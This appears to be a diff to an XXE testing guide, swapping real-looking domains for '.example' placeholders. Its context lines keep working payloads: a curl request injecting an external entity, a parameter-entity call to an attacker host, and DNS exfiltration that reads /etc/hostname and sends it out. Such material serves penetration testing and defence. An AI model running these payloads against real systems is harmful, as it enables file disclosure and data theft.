@@ -186,12 +186,12 @@ Needs zero network egress. Local DTD paths differ per distro (yelp/docbookx is c
 ### Content-Type Swap (JSON to XML)
 ```bash
 # Original JSON request
-curl -X POST https://target.com/api/endpoint \
+curl -X POST https://target.example/api/endpoint \
   -H "Content-Type: application/json" \
   -d '{"user":"test"}'
 
 # Converted to XML for XXE testing
-curl -X POST https://target.com/api/endpoint \
+curl -X POST https://target.example/api/endpoint \
   -H "Content-Type: application/xml" \
   -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
 ```
@@ -243,7 +243,7 @@ grep -rn "FEATURE_EXTERNAL_GENERAL_ENTITIES\|setExpandEntityReferences\|setFeatu
 (submit the entire payload UTF-16 encoded)
 
 <!-- Parameter entity instead of general entity -->
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.example"> %xxe;]>
 ```
 
 ### Defense: External entity fetching disabled (file:// blocked)
@@ -273,7 +273,7 @@ Transfer-Encoding: chunked
 ```xml
 <!-- DNS-only exfiltration (port 53 often allowed) -->
 <!ENTITY % data SYSTEM "file:///etc/hostname">
-<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.attacker.com/'>">
+<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.attacker.example/'>">
 
 <!-- Error-based exfiltration (no outbound needed) -->
 <!DOCTYPE foo [
